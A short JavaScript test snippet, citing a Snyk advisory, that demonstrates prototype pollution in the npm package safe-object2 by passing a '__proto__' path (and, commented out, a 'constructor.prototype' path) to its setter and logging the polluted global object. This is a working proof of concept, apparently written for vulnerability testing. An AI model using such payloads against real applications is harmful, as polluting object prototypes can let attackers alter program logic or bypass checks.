// //https://snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801
// test("prototype pollution in safe-object2", () => {
  const safeObj2 = require("safe-object2");
  const obj = safeObj2({});

  console.log({}.polluted);
  obj.setter(["__proto__", "polluted"], "yes");
  //obj.setter(["constructor","prototype", "polluted"], "yes");
  console.log({}.polluted);
// });
